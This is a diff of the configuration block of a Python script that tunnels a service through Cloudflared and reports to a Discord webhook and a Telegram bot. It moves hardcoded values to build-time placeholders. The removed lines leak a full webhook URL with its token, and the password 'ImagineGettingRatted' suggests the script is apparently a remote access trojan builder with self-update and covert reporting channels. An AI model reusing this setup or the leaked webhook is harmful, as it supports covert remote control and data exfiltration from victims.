@@ -6,30 +6,17 @@ exposes it via Cloudflared, and posts the URL to Discord webhook.
 """
 
 # ============================================================================
-# CONFIGURATION - EDIT THESE VARIABLES
+# CONFIGURATION - Values are injected from config.txt during build
 # ============================================================================
 
-# Discord webhook URL - Replace with your actual Discord webhook URL
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1502428557190758410/suo6uOCl2jkaa0jN4Cc3GIrBznYMdgKiZ7CV9FCt0c6iUEC7A8lbBJ5PehsPrbyCqDgn"
-
-# Discord bot username for webhook messages
-DISCORD_USERNAME = "IGR"
-
-# Message to display on the service
+DISCORD_WEBHOOK_URL = "BUILD_DISCORD_WEBHOOK"
+DISCORD_USERNAME = "BUILD_DISCORD_USERNAME"
 SERVICE_MESSAGE = "hello"
-
-# Host to bind the service to (0.0.0.0 for all interfaces)
 SERVICE_HOST = "0.0.0.0"
-
-# Dashboard password
-DASHBOARD_PASSWORD = "ImagineGettingRatted"
-
-# Telegram bot token and chat ID for detailed reporting
-TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"
-TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID_HERE"
-
-# Self-update URL (host new versions here)
-UPDATE_URL = ""
+DASHBOARD_PASSWORD = "BUILD_DASHBOARD_PASSWORD"
+TELEGRAM_BOT_TOKEN = "BUILD_TELEGRAM_BOT_TOKEN"
+TELEGRAM_CHAT_ID = "BUILD_TELEGRAM_CHAT_ID"
+UPDATE_URL = "BUILD_UPDATE_URL"
 
 # ============================================================================
 # END OF CONFIGURATION - DO NOT EDIT BELOW THIS LINE
